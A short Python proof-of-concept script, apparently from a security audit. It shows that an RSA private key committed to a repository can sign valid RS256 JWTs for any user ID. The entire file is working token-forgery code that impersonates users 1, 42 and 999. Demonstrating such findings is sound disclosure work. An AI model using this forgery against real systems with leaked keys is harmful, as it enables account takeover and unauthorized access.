#!/usr/bin/env python3
"""
JWT Forgery Validation Script
Demonstrates that the committed RSA private key (certs/dev-private-key.pem)
can be used to forge valid authentication tokens for any user.
"""

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from datetime import datetime, timedelta, timezone
import jwt as pyjwt

PRIVATE_KEY_PEM = open("/workspace/gin/certs/dev-private-key.pem").read()

def forge_token(user_id: int, hours_valid: int = 24) -> str:
    priv_key = serialization.load_pem_private_key(
        PRIVATE_KEY_PEM.encode(),
        password=None,
        backend=default_backend()
    )
    now = datetime.now(timezone.utc)
    payload = {
        "sub": user_id,
        "exp": int((now + timedelta(hours=hours_valid)).timestamp()),
        "iat": int(now.timestamp())
    }
    token = pyjwt.encode(payload, priv_key, algorithm="RS256")
    return token

if __name__ == "__main__":
    print("[*] Validating JWT forgery using committed private key")
    for uid in [1, 42, 999]:
        token = forge_token(uid)
        print(f"[+] User {uid}: {token[:60]}...")
    print("[!] Confirmed: Any user ID can be impersonated with valid RS256 signature")
